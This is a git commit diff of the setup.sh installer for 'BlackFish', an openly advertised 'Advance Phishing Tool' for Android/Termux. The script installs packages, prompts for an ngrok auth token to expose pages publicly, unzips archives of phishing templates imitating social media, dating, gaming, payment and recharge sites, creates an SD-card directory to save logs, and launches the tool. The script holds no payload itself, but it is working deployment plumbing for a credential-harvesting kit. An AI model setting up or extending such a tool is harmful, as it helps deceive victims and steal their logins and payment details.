e40958aafc1b0c55b5b576a2ad193e1401aee74e
●┼Waseem Akram••✓⁩ <66058079+evildevill@users.noreply.github.com>
2021-05-19 04:47:10 -0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
-##  Tool    : emptyphish (Advance Phishing Tool)
+##  Tool    : BlackFish (Advance Phishing Tool)
 ##  Author  : Waseem Akram
 ##  Github  : github.com/evildevill
 ##  Version : 2.0
-###################################################
+#############################################
 ### color selection
 cyan='\e[0;36m'
 green='\e[0;34m'
@@ -15,8 +15,7 @@ yellow='\e[0;33m'
 BlueF='\e[1;34m' #Biru
 RESET="\033[00m" #normal
 orange='\e[38;5;166m'
-###################################################
-### checking internet
+############################################
 clear
 wget -q --spider https://google.com
 if [ "$?" -eq 0 ]; then
@@ -28,15 +27,11 @@ else
     	sleep 2
 exit
 fi
-### coding section
-clear
-echo -e $cyan "                         INSTALLATION STARTED"
-echo -e $green "                 IT WILL TAKE SOME TIME BE PATIENCE "
-sleep 8.0
-apt-get update  -y > /dev/null 2>&1
-apt-get upgrade -y > /dev/null 2>&1
-echo " "
-echo " "
+echo -e $cyan                      "INSTALLING DEPENDENCIES...."
+sleep2.0
+echo -e $cyan                  "PLEASE WAIT IT WILL TAKE SOME TIME...."
+apt upgrade -y > /dev/null 2>&1
+apt update -y > /dev/null 2>&1
 termux-setup-storage
 pkg install git -y > /dev/null 2>&1
 pkg install zip -y > /dev/null 2>&1
@@ -47,6 +42,117 @@ pkg install python -y > /dev/null 2>&1
 pkg install python2 -y > /dev/null 2>&1
 pkg install nano -y > /dev/null 2>&1
 pkg install php -y > /dev/null 2>&1
-pip install lolcat > /dev/null 2>&1
+pip install lolcat 
 cd /sdcard > /dev/null 2>&1
-mkdir dUmpS > /dev/null 2>&1
+echo -e $yellow                  "MAKING DIRECTORY IN SDCARD TO SAVE LOGS...."
+mkdir Hacker-wasii > /dev/null 2>&1
+echo -e $yellow                  "DIRECTORY SUCCESSFULLY CREATED...."
+cd $HOME/BlackFish > /dev/null 2>&1
+mv log.mp3 /sdcard > /dev/null 2>&1
+cd $HOME/BlackFish/core > /dev/null 2>&1
+chmod +x ngrok > /dev/null 2>&1
+mv ngrok $HOME > /dev/null 2>&1
+cd $HOME > /dev/null 2>&1
+clear
+echo -e $yellow                     "SETTING UP NGROK FOR 1ST TIME...."
+echo -e $yellow                     "MAKE AN ACCOUNT ON NGROK.COM....."
+echo -e $cyan                    "COPY YOUR AUTH TOKEN AND PASTE HERE....."
+sleep 8.0
+clear
+am start -a android.intent.action.VIEW -d https://www.ngrok.com
+clear
+read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
+./ngrok authtoken $name
+clear 
+mv ngrok $HOME/BlackFish/core > /dev/null 2>&1
+cd $HOME/BlackFish > /dev/null 2>&1
+cd core/deploys > /dev/null 2>&1
+unzip dating.zip > /dev/null 2>&1
+unzip gaming.zip > /dev/null 2>&1
+unzip others.zip > /dev/null 2>&1
+unzip others1.zip > /dev/null 2>&1
+unzip socialmedia.zip > /dev/null 2>&1
+unzip socialmedia1.zip > /dev/null 2>&1
+unzip socialmedia2.zip > /dev/null 2>&1
+unzip socialmedia3.zip > /dev/null 2>&1
+unzip socialmedia4.zip > /dev/null 2>&1
+unzip socialmedia5.zip > /dev/null 2>&1
+unzip socialmedia6.zip > /dev/null 2>&1
+unzip socialmedia7.zip > /dev/null 2>&1
+unzip socialmedia8.zip > /dev/null 2>&1
+unzip socialmedia9.zip > /dev/null 2>&1
+unzip socialmedia10.zip > /dev/null 2>&1
+unzip socialmedia11.zip > /dev/null 2>&1
+unzip socialmedia12.zip > /dev/null 2>&1
+unzip payment.zip > /dev/null 2>&1
+unzip recharge.zip > /dev/null 2>&1                                                                      
+unzip wifirt.zip > /dev/null 2>&1                                                                    
+cd socialmedia1 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia1 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia2 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia2 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia3 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia3 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia4 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia4 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia5 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia5 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia6 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia6 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia7 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia7 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia8 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia8 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia9 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia9 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia10 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia10 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia11 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia11 > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+cd socialmedia12 > /dev/null 2>&1
+mv * $HOME/BlackFish/core/deploys/socialmedia > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf socialmedia12 > /dev/null 2>&1
+cd others1 > /dev/null 2>&1
+mv  * $HOME/BlackFish/core/deploys/others > /dev/null 2>&1
+cd $HOME/BlackFish/core/deploys > /dev/null 2>&1
+rm -rf others1 > /dev/null 2>&1
+rm *.zip > /dev/null 2>&1
+cd $HOME/BlackFish > /dev/null 2>&1
+mpv /sdcard/log.mp3
+rm setup > /dev/null 2>&1
+cd $HOME/BlackFish
+bash BlackFish.sh
